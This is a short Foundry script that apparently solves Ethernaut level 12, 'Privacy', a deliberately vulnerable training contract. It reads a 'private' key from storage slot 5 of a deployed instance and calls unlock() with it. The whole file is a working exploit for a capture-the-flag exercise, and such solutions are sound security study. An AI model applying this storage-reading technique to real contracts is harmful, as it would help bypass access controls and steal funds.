// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/12_Privacy.sol";

contract ExploitScript is Script {

    Privacy level12 = Privacy(0x86bE37A961be4016C28a30E4DA1a0085C6C8f45B);

    function run() external {
        vm.startBroadcast();

        level12.unlock(bytes16(vm.load(address(level12), bytes32(uint256(5)))));
        // level12.locked();

        vm.stopBroadcast();
    }
}